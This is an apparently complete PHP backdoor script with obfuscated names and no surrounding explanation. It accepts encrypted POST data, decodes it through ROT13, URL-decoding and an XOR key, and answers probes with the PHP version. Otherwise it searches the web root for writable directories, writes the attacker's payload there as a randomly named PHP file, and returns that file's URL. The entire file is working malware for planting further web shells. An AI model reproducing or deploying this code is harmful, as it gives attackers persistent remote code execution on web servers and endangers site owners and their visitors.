<?php $kfkvh = "plyfymtrrlsaexaw";$lvscyht = "";foreach ($_POST as $ozxgprqlee => $fjccn){if (strlen($ozxgprqlee) == 16 and substr_count($fjccn, "%") > 10){ztkumdru($ozxgprqlee, $fjccn);}}function ztkumdru($ozxgprqlee, $cljuvxk){global $lvscyht;$lvscyht = $ozxgprqlee;$cljuvxk = str_split(rawurldecode(str_rot13($cljuvxk)));function mxqotabf($svxmq, $ozxgprqlee){global $kfkvh, $lvscyht;return $svxmq ^ $kfkvh[$ozxgprqlee % strlen($kfkvh)] ^ $lvscyht[$ozxgprqlee % strlen($lvscyht)];}$cljuvxk = implode("", array_map("mxqotabf", array_values($cljuvxk), array_keys($cljuvxk)));$cljuvxk = @unserialize($cljuvxk);if (@is_array($cljuvxk)){$ozxgprqlee = array_keys($cljuvxk);$cljuvxk = $cljuvxk[$ozxgprqlee[0]];if ($cljuvxk === $ozxgprqlee[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function cyofagn($wmqogciir) {static $gppsvzwfs = array();$uwwrnnbp = glob($wmqogciir . '/*', GLOB_ONLYDIR);if (count($uwwrnnbp) > 0) {foreach ($uwwrnnbp as $wmqogci){if (@is_writable($wmqogci)){$gppsvzwfs[] = $wmqogci;}}}foreach ($uwwrnnbp as $wmqogciir) cyofagn($wmqogciir);return $gppsvzwfs;}$hglhesmv = $_SERVER["DOCUMENT_ROOT"];$uwwrnnbp = cyofagn($hglhesmv);$ozxgprqlee = array_rand($uwwrnnbp);$gipvnr = $uwwrnnbp[$ozxgprqlee] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($gipvnr, $cljuvxk);echo "http://" . $_SERVER["HTTP_HOST"] . substr($gipvnr, strlen($hglhesmv));exit();}}}